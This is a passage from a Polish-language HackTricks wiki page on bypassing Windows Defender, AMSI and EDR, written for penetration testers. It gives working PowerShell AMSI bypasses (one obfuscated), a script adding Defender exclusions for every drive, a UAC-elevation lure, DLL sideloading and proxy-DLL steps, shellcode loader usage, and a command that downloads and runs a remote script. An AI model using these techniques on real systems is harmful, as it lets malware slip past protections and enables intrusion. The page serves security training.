# Obejście programu antywirusowego (AV)

{{#include ../banners/hacktricks-training.md}}

**Ta strona została pierwotnie napisana przez** [**@m2rc_p**](https://twitter.com/m2rc_p)**!**

## Zatrzymaj Defendera

- [defendnot](https://github.com/es3n1n/defendnot): Narzędzie do zatrzymywania działania Windows Defendera.
- [no-defender](https://github.com/es3n1n/no-defender): Narzędzie do zatrzymywania działania Windows Defendera przez podszywanie się pod inny program antywirusowy.
- [Wyłącz Defendera, jeśli masz uprawnienia administratora](basic-powershell-for-pentesters/README.md)

### Przynęta UAC w stylu instalatora przed ingerencją w Defendera

Publiczne loadery podszywające się pod cheaty do gier są często rozpowszechniane jako niepodpisane instalatory Node.js/Nexe, które najpierw **proszą użytkownika o podniesienie uprawnień**, a dopiero potem unieszkodliwiają Defendera. Schemat jest prosty:

1. Sprawdź, czy proces działa z uprawnieniami administratora, za pomocą `net session`. Polecenie powiedzie się tylko wtedy, gdy wywołujący ma uprawnienia administratora, więc jego niepowodzenie oznacza, że loader działa jako zwykły użytkownik.
2. Natychmiast uruchom ponownie sam proces z czasownikiem `RunAs`, aby wywołać oczekiwany monit UAC o zgodę, zachowując oryginalny wiersz poleceń.

```powershell
if (-not (net session 2>$null)) {
    powershell -WindowStyle Hidden -Command "Start-Process cmd.exe -Verb RunAs -WindowStyle Hidden -ArgumentList '/c ""`<path_to_loader`>""'"
    exit
}
```

Ofiary już wierzą, że instalują „crackowane” oprogramowanie, więc zwykle akceptują monit, przyznając malware uprawnienia potrzebne do zmiany zasad Defendera.<sup>[[26]](#references)</sup>

### Wykluczenia `MpPreference` obejmujące każdą literę dysku

Po uzyskaniu podwyższonych uprawnień łańcuchy w stylu GachiLoadera maksymalizują martwe pola Defendera, zamiast całkowicie wyłączać usługę. Loader najpierw zamyka proces pilnujący GUI (`taskkill /F /IM SecHealthUI.exe`), a następnie dodaje **niezwykle szerokie wykluczenia**, przez co skanowanie obejmuje już żaden profil użytkownika, katalog systemowy ani dysk wymienny:

```powershell
$targets = @('C:\Users\', 'C:\ProgramData\', 'C:\Windows\')
Get-PSDrive -PSProvider FileSystem | ForEach-Object { $targets += $_.Root }
$targets | Sort-Object -Unique | ForEach-Object { Add-MpPreference -ExclusionPath $_ }
Add-MpPreference -ExclusionExtension '.sys'
```

Kluczowe obserwacje:

- Pętla przechodzi przez każdy zamontowany system plików (D:\, E:\, pamięci USB itp.), więc **każdy przyszły payload zapisany gdziekolwiek na dysku zostanie pominięty**.
- Wykluczenie rozszerzenia `.sys` jest przygotowane z myślą o przyszłości — atakujący zachowują możliwość późniejszego ładowania niepodpisanych sterowników bez ponownego ingerowania w Defendera.
- Wszystkie zmiany są wprowadzane w `HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions`, co pozwala kolejnym etapom potwierdzić, że wykluczenia nadal obowiązują, lub rozszerzyć je bez ponownego wywoływania UAC.

Ponieważ żadna usługa Defendera nie zostaje zatrzymana, naiwne kontrole stanu nadal zgłaszają, że „antywirus jest aktywny”, mimo że ochrona w czasie rzeczywistym w ogóle nie sprawdza tych ścieżek.<sup>[[26]](#references)</sup>

## **Metodyka omijania AV**

Obecnie AV stosują różne metody sprawdzania, czy plik jest złośliwy: wykrywanie statyczne, analiza dynamiczna, a w bardziej zaawansowanych EDR-ach — analiza behawioralna.

### **Wykrywanie statyczne**

Wykrywanie statyczne polega na oznaczaniu znanych złośliwych ciągów znaków lub sekwencji bajtów w pliku binarnym albo skrypcie, a także na wyodrębnianiu informacji z samego pliku (np. opisu pliku, nazwy firmy, podpisów cyfrowych, ikony, sumy kontrolnej itp.). Oznacza to, że korzystanie ze znanych, publicznych narzędzi może łatwiej doprowadzić do wykrycia, ponieważ prawdopodobnie zostały już przeanalizowane i oznaczone jako złośliwe. Istnieje kilka sposobów na obejście tego rodzaju wykrywania:

- **Szyfrowanie**

Jeśli zaszyfrujesz plik binarny, AV nie będzie w stanie wykryć twojego programu, ale będziesz potrzebować jakiegoś loadera, który odszyfruje go i uruchomi w pamięci.

- **Obfuskacja**

Czasami wystarczy zmienić kilka ciągów znaków w pliku binarnym lub skrypcie, aby ominąć AV, ale w zależności od tego, co próbujesz obfuskować, może to być czasochłonne.

- **Własne narzędzia**

Jeśli opracujesz własne narzędzia, nie będą istnieć znane sygnatury wskazujące na zagrożenie, ale wymaga to dużo czasu i wysiłku.

> [!TIP]
> Dobrym narzędziem do sprawdzania wykrywania statycznego przez Windows Defender jest [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck). Dzieli ono plik na wiele segmentów, a następnie zleca Defenderowi skanowanie każdego z nich osobno. Dzięki temu może wskazać dokładnie, które ciągi znaków lub bajty w pliku binarnym są oznaczane.

Gorąco polecam tę [playlistę na YouTube](https://www.youtube.com/playlist?list=PLj05gPj8rk_pkb12mDe4PgYZ5qPxhGKGf) poświęconą praktycznemu omijaniu AV.

### Testy cech PE w trybie offline dla klasyfikatorów statycznych

Bajty spakowanego lub zaszyfrowanego payloadu to tylko jedno ze źródeł danych dla klasyfikatora statycznego. EMBER2024 wyodrębnia cechy PE, w tym importy, eksporty, sekcje, nagłówki i dane Authenticode.<sup>[[48]](#references)</sup> W jednym eksperymencie z loaderem dodanie 141 importów wyglądających na nieszkodliwe obniżyło wynik złośliwości EMBER2024 o 93%, natomiast importy kojarzone ze złośliwym oprogramowaniem go podwyższyły. Jest to wynik uzyskany dla tego modelu i tych próbek, a nie niezawodny sposób obejścia konkretnego produktu AV/EDR.<sup>[[50]](#references)</sup>

W autoryzowanym teście loadera utrzymuj payload i ścieżkę wykonania bez zmian, modyfikuj tylko jedną planowaną zmienną kompilacji w każdym wariancie i porównuj wyniki offline. Sprawdzaj uzyskane cechy PE, ponieważ zmiana kompilacji może wpłynąć na więcej niż jedną grupę cech.<sup>[[49]](#references)[[50]](#references)</sup> Aby zachować planowane importy w IAT, wywołuj wybrane Win32 API z osiągalnego kodu. Zmieniaj ich wybór i rozkładaj miejsca wywołań pomiędzy kompilacjami, zamiast tworzyć stałą funkcję kamuflującą, która może stać się sygnaturą. W eksperymencie odnotowano również niższe wyniki przy prawidłowym podpisie kodu, wpisach eksportu i większej liczbie funkcji powiększających `.pdata`; nieprawidłowy podpis miał niewielki wpływ, a wpływ `.pdata` był mały.<sup>[[50]](#references)</sup>

Pakiet `thrember` udostępnia ekstrakcję cech i modele testowe. Po jego zainstalowaniu użyj `thrember.download_models("models")` z istniejącym katalogiem `models`, a następnie uruchom klasyfikator z katalogu nadrzędnego: funkcja pomocnicza pobierająca modele zmienia bieżący katalog roboczy. Klasyfikator PE może oceniać katalog kompilacji bez przesyłania ich do usługi skanującej:<sup>[[48]](#references)</sup>

```python
from pathlib import Path
import lightgbm as lgb
import thrember

model = lgb.Booster(model_file="models/EMBER2024_PE.model")
for sample in sorted(Path("builds").glob("*.exe")):
    print(sample, thrember.predict_sample(model, sample.read_bytes()))
```

Keep model i wersje feature-extractora niezmienne podczas porównania. Niższy wynik offline pokazuje jedynie reakcję tego klasyfikatora na zmieniony plik binarny; nie dowodzi skutecznego unikania analizy behawioralnej, emulacji ani innego modelu dostawcy.<sup>[[49]](#references)[[50]](#references)</sup> Informacje o [polimorfizmie dla poszczególnych buildów i maskowaniu zewnętrznego pliku binarnego w zwirtualizowanych payloadach](virtualized-payload-execution.md#camouflaging-the-outer-go-executable) znajdziesz w opisie osobnego modelu wykonywania.

### **Analiza dynamiczna**

Analiza dynamiczna polega na uruchomieniu przez AV pliku binarnego w sandboxie i obserwowaniu, czy podejmuje on złośliwe działania (np. próbuje odszyfrować i odczytać hasła z przeglądarki albo wykonać minidump LSASS itp.). Ta część może być nieco trudniejsza, ale oto kilka sposobów na unikanie sandboxów.

- **Uśpienie przed wykonaniem** W zależności od implementacji może to być świetny sposób na ominięcie analizy dynamicznej AV. AV ma bardzo mało czasu na skanowanie plików, aby nie zakłócać pracy użytkownika, dlatego długie uśpienie może zakłócić analizę plików binarnych. Problem polega na tym, że wiele sandboxów AV może po prostu pominąć uśpienie — zależnie od jego implementacji.
- **Sprawdzanie zasobów maszyny** Sandboxy zwykle dysponują bardzo ograniczonymi zasobami (np. < 2 GB RAM), bo w przeciwnym razie mogłyby spowalniać maszynę użytkownika. Możesz też wykazać się kreatywnością, na przykład sprawdzając temperaturę CPU, a nawet prędkość obrotową wentylatorów — sandbox może nie implementować wszystkich takich elementów.
- **Sprawdzanie cech konkretnej maszyny** Jeśli chcesz zaatakować użytkownika, którego stacja robocza jest dołączona do domeny „contoso.local”, możesz sprawdzić domenę komputera i porównać ją z podaną wartością. Jeśli się nie zgadza, program może zakończyć działanie.

Okazuje się, że nazwa komputera w sandboxie Microsoft Defender to HAL9TH. Możesz więc sprawdzić nazwę komputera w swoim malware przed detonacją — jeśli jest to HAL9TH, oznacza to, że znajdujesz się w sandboxie Defendera, więc możesz zakończyć działanie programu.

<figure><img src="../images/image (209).png" alt=""><figcaption><p>źródło: <a href="https://youtu.be/StSLxFbVz0M?t=1439">https://youtu.be/StSLxFbVz0M?t=1439</a></p></figcaption></figure>

Oto kilka innych świetnych wskazówek od [@mgeeky](https://twitter.com/mariuszbit), jak radzić sobie z sandboxami.

<figure><img src="../images/image (248).png" alt=""><figcaption><p>kanał #malware-dev na Discordzie <a href="https://discord.com/servers/red-team-vx-community-1012733841229746240">Red Team VX</a></p></figcaption></figure>

Jak już wspomnieliśmy w tym wpisie, **publiczne narzędzia** prędzej czy później **zostaną wykryte**, dlatego warto zadać sobie pytanie:

Na przykład, jeśli chcesz zrzucić LSASS, **czy naprawdę musisz użyć mimikatz**? A może możesz skorzystać z innego, mniej znanego projektu, który również zrzuca LSASS?

Najpewniej właściwa jest druga opcja. Weźmy mimikatz jako przykład: to prawdopodobnie jeden z najczęściej oznaczanych przez AV i EDR elementów malware, o ile nie najczęściej oznaczany. Sam projekt jest świetny, ale bardzo trudno wykorzystać go do omijania AV. Dlatego poszukaj alternatyw, które pozwolą osiągnąć zamierzony cel.

> [!TIP]
> Modyfikując payloady w celu uniknięcia wykrycia, pamiętaj, aby **wyłączyć automatyczne przesyłanie próbek** w Defenderze. I proszę, naprawdę, **NIE PRZESYŁAJ PRÓBEK DO VIRUSTOTAL**, jeśli chcesz na dłuższą metę unikać wykrycia. Jeśli chcesz sprawdzić, czy dany AV wykrywa twój payload, zainstaluj go na maszynie wirtualnej, spróbuj wyłączyć automatyczne przesyłanie próbek i testuj go tam, aż uzyskasz zadowalający wynik.

## EXE a DLL

Jeśli to możliwe, zawsze **stawiaj na DLL-e, aby uniknąć wykrycia**. Z mojego doświadczenia wynika, że pliki DLL są zwykle **znacznie rzadziej wykrywane i analizowane**, więc w niektórych przypadkach to prosty sposób na uniknięcie wykrycia (oczywiście jeśli payload może działać jako DLL).

Jak widać na tym obrazie, payload DLL z Havoc ma współczynnik wykrywalności 4/26 w antiscan.me, a payload EXE — 7/26.

<figure><img src="../images/image (1130).png" alt=""><figcaption><p>porównanie w antiscan.me zwykłego payloadu EXE Havoc ze zwykłą DLL Havoc</p></figcaption></figure>

Poniżej pokażemy kilka trików, które pozwolą ci skuteczniej ukrywać pliki DLL.

## DLL Sideloading & Proxying

**DLL Sideloading** wykorzystuje kolejność wyszukiwania DLL stosowaną przez loadera, umieszczając aplikację ofiary i złośliwy payload (lub payloady) obok siebie.

Możesz sprawdzić, które programy są podatne na DLL Sideloading, używając [Siofra](https://github.com/Cybereason/siofra) i poniższego skryptu PowerShell:

```bash
Get-ChildItem -Path "C:\Program Files\" -Filter *.exe -Recurse -File -Name| ForEach-Object {
    $binarytoCheck = "C:\Program Files\" + $_
    C:\Users\user\Desktop\Siofra64.exe --mode file-scan --enum-dependency --dll-hijack -f $binarytoCheck
}
```

To polecenie wyświetli listę programów podatnych na DLL Hijacking w katalogu "C:\Program Files\\" oraz plików DLL, które próbują załadować.

Gorąco polecam samodzielnie **wyszukiwać programy podatne na DLL Hijacking/Sideloading**. Ta technika, jeśli zostanie prawidłowo zastosowana, jest dość skryta, ale korzystając z publicznie znanych programów podatnych na DLL Sideloading, możesz łatwo wpaść.

Samo umieszczenie złośliwej biblioteki DLL o nazwie, której program oczekuje, nie wystarczy, by załadować payload, ponieważ program oczekuje w tej bibliotece określonych funkcji. Aby rozwiązać ten problem, zastosujemy inną technikę o nazwie **DLL Proxying/Forwarding**.

**DLL Proxying** przekazuje wywołania wykonywane przez program z biblioteki proxy (i złośliwej) do oryginalnej biblioteki DLL, dzięki czemu program zachowuje swoją funkcjonalność, a payload może zostać uruchomiony.

Skorzystam z projektu [SharpDLLProxy](https://github.com/Flangvik/SharpDllProxy) autorstwa [@flangvik](https://twitter.com/Flangvik/).

Oto kroki, które wykonałem:

```
1. Find an application vulnerable to DLL Sideloading (siofra or using Process Hacker)
2. Generate some shellcode (I used Havoc C2)
3. (Optional) Encode your shellcode using Shikata Ga Nai (https://github.com/EgeBalci/sgn)
4. Use SharpDLLProxy to create the proxy dll (.\SharpDllProxy.exe --dll .\mimeTools.dll --payload .\demon.bin)
```

Ostatnie polecenie da nam 2 pliki: szablon kodu źródłowego DLL oraz oryginalną DLL ze zmienioną nazwą.

<figure><img src="../images/sharpdllproxy.gif" alt=""><figcaption></figcaption></figure>

```
5. Create a new visual studio project (C++ DLL), paste the code generated by SharpDLLProxy (Under output_dllname/dllname_pragma.c) and compile. Now you should have a proxy dll which will load the shellcode you've specified and also forward any calls to the original DLL.
```

Oto wyniki:

<figure><img src="../images/dll_sideloading_demo.gif" alt=""><figcaption></figcaption></figure>

Zarówno nasz shellcode (zakodowany za pomocą [SGN](https://github.com/EgeBalci/sgn)), jak i proxy DLL mają współczynnik wykrywania 0/26 w [antiscan.me](https://antiscan.me)! Można to uznać za sukces.

<figure><img src="../images/image (193).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> **Gorąco polecam** obejrzeć [VOD S3cur3Th1sSh1t na Twitchu](https://www.twitch.tv/videos/1644171543) na temat DLL Sideloading, a także [film ippsec](https://www.youtube.com/watch?v=3eROsG_WNpE), aby dowiedzieć się więcej o omawianych zagadnieniach.

### Nadużywanie przekazywanych eksportów (ForwardSideLoading)

Moduły PE systemu Windows mogą eksportować funkcje będące w rzeczywistości „forwarderami”: zamiast wskazywać na kod, wpis eksportu zawiera ciąg ASCII w formacie `TargetDll.TargetFunc`. Gdy program wywołujący rozwiązuje eksport, loader systemu Windows:

- Ładuje `TargetDll`, jeśli nie został jeszcze załadowany
- Rozwiązuje `TargetFunc` z tego modułu

Ważne zachowania:
- Jeśli `TargetDll` jest KnownDLL, jest udostępniany z chronionej przestrzeni nazw KnownDLLs (np. ntdll, kernelbase, ole32).<sup>[[15]](#references)</sup>
- Jeśli `TargetDll` nie jest KnownDLL, stosowana jest standardowa kolejność wyszukiwania DLL, która obejmuje katalog modułu wykonującego przekazanie.

Umożliwia to pośrednie wykorzystanie sideloadingu: znajdź podpisaną bibliotekę DLL, która eksportuje funkcję przekazywaną do modułu o nazwie niebędącej KnownDLL, a następnie umieść obok niej kontrolowaną przez atakującego bibliotekę DLL o nazwie dokładnie takiej jak przekazywany moduł docelowy. Gdy wywołany zostanie przekazywany eksport, loader rozwiąże przekazanie i załaduje Twoją bibliotekę DLL z tego samego katalogu, uruchamiając jej DllMain.<sup>[[13]](#references)</sup>

Przykład zaobserwowany w systemie Windows 11:

```
keyiso.dll KeyIsoSetAuditingInterface -> NCRYPTPROV.SetAuditingInterface
```

`NCRYPTPROV.dll` nie jest KnownDLL, więc jest wyszukiwany zgodnie ze standardową kolejnością wyszukiwania.

PoC (kopiuj-wklej):
1) Skopiuj podpisaną systemową bibliotekę DLL do folderu z uprawnieniami do zapisu.
```
copy C:\Windows\System32\keyiso.dll C:\test\
```
2) Umieść złośliwą `NCRYPTPROV.dll` w tym samym folderze. Minimalny `DllMain` wystarczy do wykonania kodu; nie musisz implementować przekazywanej funkcji, aby wywołać `DllMain`.
```c
// x64: x86_64-w64-mingw32-gcc -shared -o NCRYPTPROV.dll ncryptprov.c
#include <windows.h>
BOOL WINAPI DllMain(HINSTANCE hinst, DWORD reason, LPVOID reserved){
    if (reason == DLL_PROCESS_ATTACH){
        HANDLE h = CreateFileA("C\\\\test\\\\DLLMain_64_DLL_PROCESS_ATTACH.txt", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
        if(h!=INVALID_HANDLE_VALUE){ const char *m = "hello"; DWORD w; WriteFile(h,m,5,&w,NULL); CloseHandle(h);}        
    }
    return TRUE;
}
```
3) Uruchom przekazywanie przy użyciu podpisanego LOLBin:
```
rundll32.exe C:\test\keyiso.dll, KeyIsoSetAuditingInterface
```

Zaobserwowane zachowanie:
- rundll32 (podpisany) ładuje side-by-side `keyiso.dll` (podpisany)
- Podczas rozpoznawania `KeyIsoSetAuditingInterface` loader podąża za przekierowaniem do `NCRYPTPROV.SetAuditingInterface`
- Następnie loader ładuje `NCRYPTPROV.dll` z `C:\test` i wykonuje jego `DllMain`
- Jeśli `SetAuditingInterface` nie jest zaimplementowane, błąd „missing API” pojawi się dopiero po wykonaniu `DllMain`

Wskazówki dotyczące poszukiwań:
- Skup się na przekierowanych eksportach, których moduł docelowy nie jest KnownDLL. KnownDLLs są wymienione w `HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs`.
- Przekierowane eksporty można wyliczyć za pomocą narzędzi takich jak:
```
dumpbin /exports C:\Windows\System32\keyiso.dll
# forwarders appear with a forwarder string e.g., NCRYPTPROV.SetAuditingInterface
```
- Zobacz spis forwarderów systemu Windows 11, aby wyszukać kandydatów: https://hexacorn.com/d/apis_fwd.txt<sup>[[14]](#references)</sup>

Pomysły na wykrywanie i ochronę:
- Monitoruj LOLBins (np. rundll32.exe) ładujące podpisane biblioteki DLL ze ścieżek innych niż systemowe, a następnie ładujące z tego katalogu biblioteki DLL niebędące KnownDLLs o tej samej nazwie bazowej
- Generuj alerty dotyczące łańcuchów procesów/modułów, takich jak: `rundll32.exe` → niesystemowy `keyiso.dll` → `NCRYPTPROV.dll` w ścieżkach zapisywalnych przez użytkownika
- Wymuszaj stosowanie zasad integralności kodu (WDAC/AppLocker) i zabraniaj zapisu oraz wykonywania w katalogach aplikacji

## [**Freeze**](https://github.com/optiv/Freeze)

`Freeze to zestaw narzędzi do obsługi payloadów, służący do omijania EDR-ów za pomocą zawieszonych procesów, bezpośrednich wywołań systemowych i alternatywnych metod wykonywania`

Możesz użyć Freeze do załadowania i wykonania swojego shellcode w ukryty sposób.

```
Git clone the Freeze repo and build it (git clone https://github.com/optiv/Freeze.git && cd Freeze && go build Freeze.go)
1. Generate some shellcode, in this case I used Havoc C2.
2. ./Freeze -I demon.bin -encrypt -O demon.exe
3. Profit, no alerts from defender
```

<figure><img src="../images/freeze_demo_hacktricks.gif" alt=""><figcaption></figcaption></figure>

> [!TIP]
> Evasion to gra w kotka i myszkę — to, co działa dzisiaj, jutro może zostać wykryte, dlatego nigdy nie polegaj tylko na jednym narzędziu; jeśli to możliwe, spróbuj łączyć kilka technik evasion.

## Bezpośrednie/pośrednie syscalle i rozpoznawanie SSN (SysWhispers4)

EDR-y często umieszczają **hooki inline w trybie użytkownika** w stubach syscalli `ntdll.dll`. Aby ominąć te hooki, możesz wygenerować stuby syscalli **bezpośrednie** lub **pośrednie**, które ładują prawidłowy **SSN** (System Service Number) i przechodzą do trybu jądra bez wykonywania zahookowanego punktu wejścia eksportu.<sup>[[32]](#references)</sup>

**Opcje wywołania:**
- **Direct (osadzony)**: umieść instrukcję `syscall`/`sysenter`/`SVC #0` w wygenerowanym stubie (bez odwołania do eksportu `ntdll`).
- **Indirect**: wykonaj skok do istniejącego gadżetu `syscall` wewnątrz `ntdll`, aby przejście do jądra wyglądało na pochodzące z `ntdll` (przydatne do evasion heurystycznego); **randomized indirect** wybiera gadżet z puli przy każdym wywołaniu.
- **Egg-hunt**: uniknij osadzania na dysku statycznej sekwencji opcode `0F 05`; znajdź sekwencję syscalla w czasie wykonywania.

**Odporne na hooki strategie rozpoznawania SSN:**
- **FreshyCalls (VA sort)**: wywnioskuj SSN, sortując stuby syscalli według adresu wirtualnego zamiast odczytywać bajty stubów.
- **SyscallsFromDisk**: zamapuj czysty `\KnownDlls\ntdll.dll`, odczytaj SSN z jego sekcji `.text`, a następnie usuń mapowanie (omija wszystkie hooki w pamięci).
- **RecycledGate**: połącz wnioskowanie SSN na podstawie sortowania VA z walidacją opcode, gdy stub jest czysty; jeśli jest zahookowany, użyj wnioskowania na podstawie VA.
- **HW Breakpoint**: ustaw DR0 na instrukcji `syscall` i użyj VEH, aby przechwycić SSN z `EAX` w czasie wykonywania, bez analizowania zahookowanych bajtów.

Przykład użycia SysWhispers4:
```bash
# Indirect syscalls + hook-resistant resolution
python syswhispers.py --preset injection --method indirect --resolve recycled

# Resolve SSNs from a clean on-disk ntdll
python syswhispers.py --preset injection --method indirect --resolve from_disk --unhook-ntdll

# Hardware breakpoint SSN extraction
python syswhispers.py --functions NtAllocateVirtualMemory,NtCreateThreadEx --resolve hw_breakpoint
```

Podczas parsowania czystych eksportów syscalli x64 z `ntdll` w celu odczytania SSN uwzględnij zarówno `4C 8B D1 B8` (`mov r10, rcx; mov eax, imm32`), jak i tę samą sekwencję poprzedzoną przez `F3 0F 1E FA` (`endbr64`). Ten drugi wariant to stub z prefiksem CET: parser zakładający, że SSN zawsze znajduje się pod jednym stałym offsetem, go pominie. Jeśli inicjalizacja indirect syscalli się nie powiedzie, a loader przejdzie na `GetProcAddress`, wywołania przez te eksporty mogą ponownie napotkać hooki w trybie użytkownika.<sup>[[54]](#references)</sup>

### Alternatywne eksporty syscalli w `tprtdll.dll`

Projekt podaje, że `tprtdll.dll` to biblioteka DLL podpisana przez Microsoft, obecna w `C:\Windows\System32\` w systemie Windows 11 w kompilacji 26100 i nowszych. Jej adresy kodu są inne niż w `ntdll.dll`, więc hook modyfikujący tylko punkt wejścia syscalla w `ntdll` nie zmodyfikuje odpowiadającego mu stubu w `tprtdll`. W odróżnieniu od opisanych wyżej metod rozpoznawania SSN to podejście ładuje `tprtdll.dll` i wywołuje bezpośrednio dostępny eksport `Nt*` lub `Zw*` za pomocą `GetProcAddress`. Sprawdź, czy biblioteka DLL i wymagane eksporty istnieją, oraz użyj odpowiednich prototypów funkcji NT.<sup>[[55]](#references)</sup>

PoC self-injection używa `tprtdll!NtAllocateVirtualMemoryEx` do przydzielenia pamięci RW, kopiuje bajty za pomocą `memcpy`, zmienia uprawnienia regionu na RX za pomocą `tprtdll!ZwProtectVirtualMemory` i uruchamia wątek przez `tprtdll!RtlCreateUserThread`.<sup>[[56]](#references)</sup> Wariant międzyprocesowy wymaga dostępnego uchwytu do procesu docelowego i używa `WriteProcessMemory` do skopiowania danych.<sup>[[57]](#references)</sup> Inwentarz eksportów projektu nie zawiera `NtOpenProcess`, `NtWriteVirtualMemory` ani `NtCreateThreadEx`, więc nie każda operacja iniekcji może korzystać z alternatywnego eksportu.<sup>[[55]](#references)</sup>

PoC nie dowodzi, że `RtlCreateUserThread` jest bezpośrednim stubem syscalla ani że jego wywołania wewnętrzne omijają hooki `ntdll` tylko dlatego, że eksport rozwiązano z `tprtdll`.<sup>[[56]](#references)</sup> Przykład międzyprocesowy zawiera też adresy `WinExec` i `ExitThread` rozwiązane w procesie wstrzykującym; aby payload zadziałał, adresy te muszą być prawidłowe w procesie docelowym.<sup>[[57]](#references)</sup>

Metoda ta omija tylko hooki ograniczone do odpowiadających im eksportów `ntdll`; nie ukrywa syscalli przed monitorowaniem na poziomie jądra.<sup>[[55]](#references)</sup> Opis trasy iniekcji, która zamiast tego unika zdalnego zapisu i tworzenia nowych wątków, znajdziesz w artykule [Thread Name-Calling and Waiting Thread Hijacking](windows-process-injection-thread-name-calling-waiting-thread-hijacking.md).

## AMSI (Anti-Malware Scan Interface)

AMSI stworzono, aby zapobiegać „[fileless malware](https://en.wikipedia.org/wiki/Fileless_malware)”. Początkowo programy antywirusowe potrafiły skanować tylko **pliki na dysku**, więc jeśli udało się uruchomić payloady **bezpośrednio w pamięci**, program antywirusowy nie mógł temu zapobiec, ponieważ nie miał wystarczającego wglądu.

Funkcja AMSI jest zintegrowana z następującymi składnikami systemu Windows:

- Kontrola konta użytkownika, czyli UAC (podnoszenie uprawnień podczas instalacji EXE, COM, MSI lub ActiveX)
- PowerShell (skrypty, użycie interaktywne i dynamiczna ewaluacja kodu)
- Windows Script Host (wscript.exe i cscript.exe)
- JavaScript i VBScript
- Makra VBA pakietu Office

Umożliwia rozwiązaniom antywirusowym analizowanie zachowania skryptów, udostępniając ich zawartość w postaci niezaszyfrowanej i nieukrytej.

Uruchomienie `IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1')` wywoła następujący alert w programie Windows Defender.

<figure><img src="../images/image (1135).png" alt=""><figcaption></figcaption></figure>

Zwróć uwagę, że na początku dodawane jest `amsi:`, a następnie ścieżka do pliku wykonywalnego, z którego uruchomiono skrypt — w tym przypadku powershell.exe.

Nie zapisaliśmy żadnego pliku na dysku, a mimo to zostaliśmy wykryci w pamięci przez AMSI.

Co więcej, począwszy od **.NET 4.8**, kod C# również jest analizowany przez AMSI. Dotyczy to nawet ładowania kodu do wykonania w pamięci za pomocą `Assembly.Load(byte[])`. Dlatego do wykonywania kodu w pamięci z zamiarem uniknięcia AMSI zaleca się używanie starszych wersji .NET (takich jak 4.7.2 lub wcześniejsze).

Istnieje kilka sposobów na obejście AMSI:

- **Obfuskacja**

Ponieważ AMSI opiera się głównie na wykrywaniu statycznym, modyfikowanie skryptów, które próbujesz załadować, może być dobrym sposobem na uniknięcie wykrycia.

AMSI potrafi jednak zdekodować skrypty nawet wtedy, gdy mają wiele warstw obfuskacji, więc obfuskacja może być złym rozwiązaniem — zależnie od sposobu jej zastosowania. Dlatego uniknięcie wykrycia nie jest takie proste. Czasami wystarczy jednak zmienić kilka nazw zmiennych, więc wiele zależy od tego, w jakim stopniu dany element został oznaczony jako podejrzany.

- **Obejście AMSI**

AMSI jest implementowane przez załadowanie biblioteki DLL do procesu powershell (a także cscript.exe, wscript.exe itd.), więc można łatwo ingerować w jego działanie, nawet jako nieuprzywilejowany użytkownik. Z powodu tej wady implementacji AMSI badacze znaleźli wiele sposobów na uniknięcie skanowania AMSI.

**Wymuszenie błędu**

Wymuszenie niepowodzenia inicjalizacji AMSI (`amsiInitFailed`) spowoduje, że w bieżącym procesie skanowanie nie zostanie uruchomione. Początkowo ujawnił to [Matt Graeber](https://twitter.com/mattifestation), a Microsoft opracował sygnaturę, aby zapobiec powszechniejszemu stosowaniu tej metody.

```bash
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```

Wystarczył jeden wiersz kodu PowerShell, aby uniemożliwić działanie AMSI w bieżącym procesie PowerShell. Oczywiście ten wiersz został wykryty przez samo AMSI, więc aby zastosować tę technikę, trzeba go zmodyfikować.

Oto zmodyfikowany AMSI bypass z tego [Github Gist](https://gist.github.com/r00t-3xp10it/a0c6a368769eec3d3255d4814802b5db).

```bash
Try{#Ams1 bypass technic nº 2
      $Xdatabase = 'Utils';$Homedrive = 'si'
      $ComponentDeviceId = "N`onP" + "ubl`ic" -join ''
      $DiskMgr = 'Syst+@.MÂ£nÂ£g' + 'e@+nt.Auto@' + 'Â£tion.A' -join ''
      $fdx = '@ms' + 'Â£InÂ£' + 'tF@Â£' + 'l+d' -Join '';Start-Sleep -Milliseconds 300
      $CleanUp = $DiskMgr.Replace('@','m').Replace('Â£','a').Replace('+','e')
      $Rawdata = $fdx.Replace('@','a').Replace('Â£','i').Replace('+','e')
      $SDcleanup = [Ref].Assembly.GetType(('{0}m{1}{2}' -f $CleanUp,$Homedrive,$Xdatabase))
      $Spotfix = $SDcleanup.GetField($Rawdata,"$ComponentDeviceId,Static")
      $Spotfix.SetValue($null,$true)
   }Catch{Throw $_}
```

Pamiętaj, że ten post prawdopodobnie zostanie oznaczony po opublikowaniu, więc jeśli chcesz pozostać niewykryty, nie publikuj żadnego kodu.

**Memory Patching**

Technika ta została początkowo odkryta przez [@RastaMouse](https://twitter.com/_RastaMouse/) i polega na znalezieniu adresu funkcji „AmsiScanBuffer” w amsi.dll (odpowiedzialnej za skanowanie danych wejściowych dostarczonych przez użytkownika) i nadpisaniu jej instrukcjami zwracającymi kod E_INVALIDARG. Dzięki temu wynik rzeczywistego skanowania wynosi 0, co jest interpretowane jako czysty wynik.

> [!TIP]
> Przeczytaj [https://rastamouse.me/memory-patching-amsi-bypass/](https://rastamouse.me/memory-patching-amsi-bypass/), aby uzyskać bardziej szczegółowe wyjaśnienie.

Istnieje też wiele innych technik omijania AMSI w powershellu. Więcej informacji znajdziesz na [**tej stronie**](basic-powershell-for-pentesters/index.html#amsi-bypass) i w [**tym repozytorium**](https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell).

### Przekierowanie wskaźnika skanowania AMSI COM zamiast patchowania `AmsiScanBuffer`

